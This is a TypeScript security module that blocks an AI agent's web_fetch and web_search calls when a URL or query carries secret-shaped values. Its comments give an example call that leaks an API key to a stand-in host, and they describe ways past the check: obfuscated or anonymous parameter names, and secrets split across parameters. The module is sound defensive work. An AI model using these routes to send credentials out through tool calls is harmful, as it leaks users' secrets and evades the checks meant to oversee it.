import {
  detectSecrets,
  detectEntropy,
  looksSecretShapedIn,
  appendIncident,
  isEntropyBackendEnabled,
} from "../../security/service";

// S-8 (flow 355, AC4): `web_fetch` and `web_search` checked the requested
// public host, but never the SECRET-SHAPED content a model can put in a URL or
// a query itself — `web_fetch({url:"https://x.example/c?k=sk-…"})` sent the
// key to `x.example` before anything downstream had a chance to redact
// anything, because redaction only ever ran on what came BACK. This is the
// egress-side twin of `redactSensitiveText` (S-6): the same detector floor
// (patterns + entropy, with entropy's own allow-shapes so a URL carrying an
// ordinary commit SHA still fetches), run on what is about to LEAVE the
// machine instead of on what arrived.
//
// F-SEC-F1 (flow 355 review round, PR #776): the check above only fires when
// a param/segment NAME is on a closed list (a NAMED-pattern rule in
// `detectSecrets`) or a sensitive word sits nearby (`detectEntropy`'s own
// label requirement) — `?d=<opaque-40-char-value>` (an anonymous name) and
// `t%6fken=<value>` (a percent-encoded NAME evading a name-based check) both
// slipped through. Fixed: `outboundUrlComponents` below decomposes the URL
// (when `text` parses as one) into every path segment, query VALUE and the
// fragment, percent-decodes each once, and runs the LABEL-FREE shape check
// on every one of them — regardless of what it is called. Percent-decoding is
// safe here (unlike `detect/entropy.ts`'s own URL handling): this function
// returns a boolean, never a span, so a length change from decoding costs
// nothing.
//
// REVIEW ROUND 2 — the coordinator's own probe against real URLs found this
// module STILL refused two ordinary ones: an npm tarball URL (a versioned
// filename, `typescript-5.6.3.tgz`, evaluated as one whole segment here
// though `detect/entropy.ts`'s redaction path had already been fixed to
// re-tokenise it instead) and `web_search`'s own query shape
// (`q=bun+test+timeout+flaky` — `+`-joined words, entropy.ts's OWN
// `detectEntropy(text)` call above scored the un-split run). Both were the
// SAME root cause from two different angles: this module and
// `detect/entropy.ts` each made their own shape decision instead of sharing
// one. Fixed by calling `looksSecretShapedIn` — `detect/entropy.ts`'s own
// shared primitive — on each decomposed component instead of evaluating the
// whole string; there is one shape decision now, not two.
//
// DOCUMENTED LIMIT (do not build a heuristic for this): a secret deliberately
// SPLIT across two or more params/segments, each individually below the
// shape/entropy threshold, is invisible to a per-value check by construction
// — there is no single value to test. Closing that would need cross-value
// correlation this module does not attempt; see findings.md row S-8.
//
// DOCUMENTED DECISION: a presigned-URL signature (AWS `X-Amz-Signature`, GCS
// `X-Goog-Signature`, an Azure SAS `sig=`) IS a live, credential-bearing value
// for the URL's validity window, and this check refuses it exactly like any
// other query-embedded secret. `web_fetch`ing a presigned URL is therefore out
// of scope for this tool — a deliberate trade-off, not an oversight; an
// operator who legitimately needs one fetches it another way. The SAME value
// arriving in TOOL OUTPUT is correctly redacted by `redactSensitiveText`
// (S-6) rather than refused, which is the right asymmetry: refusing an
// outbound fetch trades a false refusal for zero exfiltration risk, while
// redacting inbound output trades nothing — the content already arrived.

// REG-F2 (flow 355 review round 3): REG-F1 only reached a hex tail that is
// the LAST segment of an already-valid word slug (`entropy.ts`'s
// `isSlugHexTail`); a GitHub Gist URL's real, common shape —
// `gist.github.com/<user>/<32-hex-id>` — is a SINGLE bare path segment that
// never reaches `isWordSlug` at all, so it fell straight to the unconditional
// hex-blob branch and `web_fetch` still refused an entirely ordinary, public
// URL. A small, DOCUMENTED host + path-shape allowlist for public
// paste/commit identifiers, consulted ONLY here (the OUTBOUND check) — never
// by `entropy.ts`'s redaction path (S-6/S-9), which is unaffected: the same
// value arriving in TOOL OUTPUT is still redacted exactly as before, since a
// value that already arrived costs nothing to identify later, while refusing
// an ordinary outbound fetch is a pure loss. Shape-only, host-gated — never a
// name/label — so this cannot become a bypass for an actual secret placed at
// one of these exact host+path shapes on an attacker-controlled domain: the
// host check is an exact hostname match, not a substring/suffix one.
const HEX32_FRAGMENT = "[0-9a-f]{32}";
const SHA40_FRAGMENT = "[0-9a-f]{40}";
const GIST_HEX32_PATH_RE = new RegExp(`^/(?:[^/]+/)?(${HEX32_FRAGMENT})/?$`, "i");
const GITHUB_COMMIT_OR_BLOB_PATH_RE = new RegExp(`/(?:commit|blob)/(${SHA40_FRAGMENT})(?:/|$)`, "i");
const GITLAB_COMMIT_PATH_RE = new RegExp(`/-/commit/(${SHA40_FRAGMENT})(?:/|$)`, "i");

/**
 * The known-public-identifier substring in `url`, if any — `gist.github.com`
 * `/<user>/<hex32>` or `/<hex32>`; `github.com` `/…/commit/<sha40>` or
 * `/…/blob/<sha40>/…`; `gitlab.com` `/-/commit/<sha40>`. Returns the matched
 * identifier itself (never the whole URL), so only that value is exempted —
 * a secret elsewhere in the SAME url (an unrelated query parameter, say) is
 * still caught.
 */
function knownPublicIdentifierIn(url: URL): string | null {
  const host = url.hostname.toLowerCase();
  if (host === "gist.github.com") {
    return GIST_HEX32_PATH_RE.exec(url.pathname)?.[1] ?? null;
  }
  if (host === "github.com") {
    return GITHUB_COMMIT_OR_BLOB_PATH_RE.exec(url.pathname)?.[1] ?? null;
  }
  if (host === "gitlab.com") {
    return GITLAB_COMMIT_PATH_RE.exec(url.pathname)?.[1] ?? null;
  }
  return null;
}

/**
 * `text` with any known-public-identifier substring (see
 * `knownPublicIdentifierIn`) replaced by an equal-length, non-secret-shaped
 * placeholder — never dropped, so every OTHER offset/component in `text`
 * scans exactly as before. Returns `text` unchanged when it is not a URL, or
 * matches no allowlisted host+path shape.
 */
function stripKnownPublicIdentifier(text: string): string {
  let url: URL;
  try {
    url = new URL(text);
  } catch {
    return text;
  }
  const identifier = knownPublicIdentifierIn(url);
  if (identifier === null) {
    return text;
  }
  return text.replace(identifier, "0".repeat(identifier.length));
}

function safeDecodeComponent(value: string): string {
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

/** Every path segment, query VALUE and the fragment, percent-decoded once. */
function outboundUrlComponents(text: string): string[] {
  let url: URL;
  try {
    url = new URL(text);
  } catch {
    return [];
  }
  const components: string[] = [];
  for (const segment of url.pathname.split("/")) {
    if (segment.length > 0) {
      components.push(safeDecodeComponent(segment));
    }
  }
  for (const [, value] of url.searchParams) {
    // `URLSearchParams` already decodes the value; the NAME is deliberately
    // never consulted (F-SEC-F1) — a percent-encoded or otherwise obfuscated
    // name must not exempt an otherwise secret-shaped value.
    if (value.length > 0) {
      components.push(value);
    }
  }
  if (url.hash.length > 1) {
    components.push(safeDecodeComponent(url.hash.slice(1)));
  }
  return components;
}

function anyComponentLooksSecret(text: string): boolean {
  // `looksSecretShapedIn`'s shape decision is entropy-based (F-REG-F3): it
  // must honour the same gate `detectEntropy(text)` below already does, so a
  // disabled entropy backend turns this check off too, not just the whole-URL
  // one.
  const entropyGateOpen = isEntropyBackendEnabled();
  for (const component of outboundUrlComponents(text)) {
    if (detectSecrets(component).length > 0) {
      return true;
    }
    if (entropyGateOpen && looksSecretShapedIn(component)) {
      return true;
    }
  }
  return false;
}

/** True when `text` (a URL or a search query) carries secret-shaped content. */
export function containsOutboundSecret(text: string): boolean {
  // REG-F2: a known public paste/commit identifier (Gist id, GitHub/GitLab
  // commit SHA) is swapped for an equal-length, non-secret-shaped placeholder
  // BEFORE any of the checks below run, so none of them ever sees it — every
  // other component of `text` (an unrelated query parameter, say) still
  // scans unchanged.
  const scanText = stripKnownPublicIdentifier(text);
  if (detectSecrets(scanText).length > 0) {
    return true;
  }
  // F-REG-F3: honours `backends.entropy.enabled`, the same gate
  // `redactSensitiveText` now respects — see `security/entropy-gate.ts`.
  if (isEntropyBackendEnabled() && detectEntropy(scanText).length > 0) {
    return true;
  }
  return anyComponentLooksSecret(scanText);
}

/**
 * Record the refusal as a security incident (§14) — policy-level metadata
 * only, never the url/query text itself, and never the matched value. A
 * logging failure must not undo a refusal that already happened, so this
 * never throws.
 */
export async function recordOutboundSecretFinding(
  cwd: string,
  tool: "web_fetch" | "web_search",
  subject: "url" | "query",
): Promise<void> {
  try {
    await appendIncident(cwd, {
      at: new Date().toISOString(),
      type: "egress-blocked",
      message: "outbound secret-shaped content",
      details: { policyId: "egress.outbound-secret", tool, subject },
    });
  } catch {
    // Best-effort: the refusal already happened; a disk error here must not
    // surface as a DIFFERENT failure to the caller.
  }
}
